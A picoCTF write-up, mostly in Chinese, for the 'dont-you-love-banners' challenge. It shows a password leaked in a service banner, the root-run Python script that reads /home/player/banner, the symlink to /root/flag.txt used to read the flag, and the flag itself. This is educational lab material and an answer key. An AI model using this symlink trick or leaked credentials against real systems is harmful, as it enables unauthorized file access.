
# dont-you-love-banners
[Challenge](https://play.picoctf.org/practice/challenge/437)

## Description

The server has been leaking some crucial information on [tethys.picoctf.net](http://tethys.picoctf.net/) 61966. Use the leaked information to get to the server.
To connect to the running application use nc [tethys.picoctf.net](http://tethys.picoctf.net/) 53050. From the above information abuse the machine and find the flag in the /root directory.

## Hints

1. Do you know about symlinks?
2. Maybe some small password cracking or guessing

## Solution

這題就比較有趣了，首先題目說第一個目標有資訊洩漏，先連上去看看。

```bash
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 61508
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

回了一組密碼給我，就沒有下文了，連連看第二個，結果就問我密碼，用了剛剛得到的那組後順利進到下一題。接下來兩題就是問了最top的資安conference是哪個跟第一個phreaking的人是誰，我都是上網找答案的，就可以順利連線上主機了，這邊先上過程：

```bash
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 63921
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$
```

成功進去後的目錄底下有兩個檔案，分別是`banner`跟`text`，兩個內容如下：

```bash
player@challenge:~$ ls
banner  text
player@challenge:~$ cat banner  
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
keep digging
```

毫無幫助!!!
只好繼續挖掘了，翻找了一陣子算是找到flag（位置再`/root`底下，沒錯我忘記題目有講了）。但沒有權限開啟，該目錄底下還放了一支python檔案，查看後發現就是我們連線時觸發的程式。

```bash
player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
player@challenge:/root$ cat script.py
cat script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```

其實因為無權開啟所以我卡很久，一直在找提權的方式，然後也有因為解其他題的靈感跑來嘗試看看，但都沒用。後來看提示提到的symlinks，再加上python開頭會去讀取banner，才搞懂他只是要我建立捷徑而已。建立好後只要重新nc上去觸發那支python就可以看到flag了~~這邊真的卡相當久呢….

```bash
player@challenge:~$ ls -l
ls -l
total 4
lrwxrwxrwx 1 player player  8 Mar 20 04:49 banner -> flag.txt
-rw-r--r-- 1 root   root   13 Feb  7 17:25 text
player@challenge:~$ rm -r banner
rm -r banner
player@challenge:~$ ls
ls
text
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
player@challenge:~$ ls -l
ls -l
total 4
lrwxrwxrwx 1 player player 14 Mar 20 04:52 banner -> /root/flag.txt
-rw-r--r-- 1 root   root   13 Feb  7 17:25 text
player@challenge:~$

┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 63921
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}
```